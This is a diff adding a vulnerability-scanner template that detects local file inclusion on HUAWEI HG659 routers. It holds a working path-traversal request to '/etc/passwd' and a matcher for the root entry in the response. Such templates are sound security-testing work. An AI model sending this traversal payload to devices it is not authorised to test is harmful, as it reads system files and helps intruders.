@@ -1,0 +1,29 @@
+id: "huawei-hg659-lfi"
+name: "HUAWEI HG659 - Local File Inclusion"
+severity: "high"
+description: "HUAWEI HG659 is vulnerable to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "lfi"
+  - "huawei"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://twitter.com/sec715/status/1406782172443287559"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/lib///....//....//....//....//....//....//....//....//etc//passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
